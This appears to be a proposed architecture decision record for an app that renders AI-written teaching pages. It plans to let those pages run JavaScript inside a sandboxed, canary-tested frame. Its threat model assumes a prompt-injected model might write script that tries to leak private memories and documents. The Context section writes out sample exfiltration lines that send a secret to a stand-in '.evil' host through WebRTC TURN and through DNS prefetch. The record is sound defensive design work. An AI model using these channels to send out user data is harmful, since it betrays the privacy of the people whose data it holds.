# 0012. Scripted pages run only when asked, in a sandboxed frame, and only after a canary proves the seal

Date: 2026-11-23
Status: PROPOSED (Kev to decide). Came from the 1.6 follow-ups (#893). Kev asked "How can it be better?", and one
answer was interactive teaching pages: a pendulum, a sorting animation, a quiz.
Proposed by: Kev + claude-opus-5-5 (decider: Kev)
Challenger verdict: no-go on the sketch below; go-with-changes as in the Decision.

## Context

Pages M1K3 writes (and, since #895, pages shared into it) render beside the chat in a sealed WKWebView:
JavaScript off, every sub-resource blocked by a content rule list, a CSP, no navigation off the page. The
page's content comes from a model that may have read private data (memories, documents, chat history). It may
also have been steered by a prompt injection in a web page or a file. So a page's script must be treated as
hostile and wanting to get out.

A challenger pass (2026-11-23) on the obvious sketch ("turn JS on and add `connect-src 'none'`") found:

- **WebRTC is not covered by CSP** (the challenger's analysis, unproven here; the canary in decision 3 settles it). `new RTCPeerConnection({iceServers: [{urls: 'turn:x.evil', username:
  SECRET}]})` sends UDP and DNS from WebKit's network process. No CSP directive and no content rule list stops it,
  and the app holds `network.client`. This is the likeliest real exfiltration.
- **The CSP could be dropped or preempted.** The old splice skipped pages with no `<head>`, or with the policy
  text in a comment, and ran after a script placed before the head. Fixed in #896 (merged 2026-11-23), proven with a
  WebKit inline-script canary.
- **DNS prefetch / preconnect** (`<link rel=dns-prefetch href=//SECRET.evil>`) has no CSP directive, and we have not
  proven the rule list sees it. This is unknown even with JS off.
- **Auto-open.** A landed answer opens its page with no click, so injected code would run unprompted.
- Permission prompts under M1K3's name (mic, location), paste-jacking ("copy this into Terminal"), CPU drain
  beside a running model, and VoiceOver blindness to canvas.

The no-JS alternative covers much of the teaching value: CSS keyframes, SVG SMIL animation, and quizzes built from
`<details>` / `:has()` all render under today's seal.

## Decision (proposed)

1. **Pages open sealed, always, as today.** Auto-open never runs script.
2. A per-page **Run** button, never remembered, reloads that page into a **scripted view**:
   - a static outer document we write, carrying the CSP (today's, plus `script-src 'unsafe-inline'`; no eval, no wasm),
   - the page inside an escaped `<iframe sandbox="allow-scripts" srcdoc="…">`: an opaque origin with no
     same-origin, popups, top navigation, modals, forms or downloads, and camera, mic and geolocation denied to the frame,
   - `isLockdownModeEnabled` on the webpage preferences (Lockdown restricts WebRTC, JIT and WebGL among others;
     which of these it switches off for a single WKWebView is for the canary to prove, not this ADR to assert),
   - JS enabled only for the initial navigation (`decidePolicyFor(_:preferences:)`), with navigation limited to
     the initial load, fragments and `about:srcdoc`,
   - a deny-all `WKUIDelegate`, the same content rule list, `baseURL: nil`, and the view torn down when hidden.
3. The button's label says: "This page runs code. It can't reach the internet." **It ships only after a canary
   harness proves that sentence**, on the Mac and the iPhone: one hostile page per channel (WebRTC STUN/TURN to a
   loopback UDP listener, DNS-prefetch and preconnect to a unique label watched in the resolver log, fetch,
   WebSocket, beacon, `<a ping>`, `location=`, meta refresh, CSS `url()`, a page-injected CSP). Every channel
   must get zero hits. The harness reads results through `webView.title`, never a message handler.
4. Before any of that: an eval of whether Lil and Mini can write working, library-free canvas JS. If they can't,
   this isn't worth the risk.

## Consequences

- "It can't reach the internet" becomes a public privacy promise that must be re-proved on every WebKit update. The
  canary harness becomes a release check.
- Accessibility: a canvas sim is invisible to VoiceOver. A scripted page needs a text description, or it's not an
  edtech feature.
- If Kev declines, the no-JS route stands, and the DNS-prefetch canary is still owed for today's seal.

## Alternatives

- **Meta CSP + JS on, in the top document** (the original sketch). Rejected: it leaves WebRTC and auto-run open.
- **A custom scheme handler serving a header CSP.** Equivalent to the srcdoc frame, with more moving parts.
- **`limitsNavigationsToAppBoundDomains`.** iOS-only, app-wide, and it governs navigation, not WebRTC.
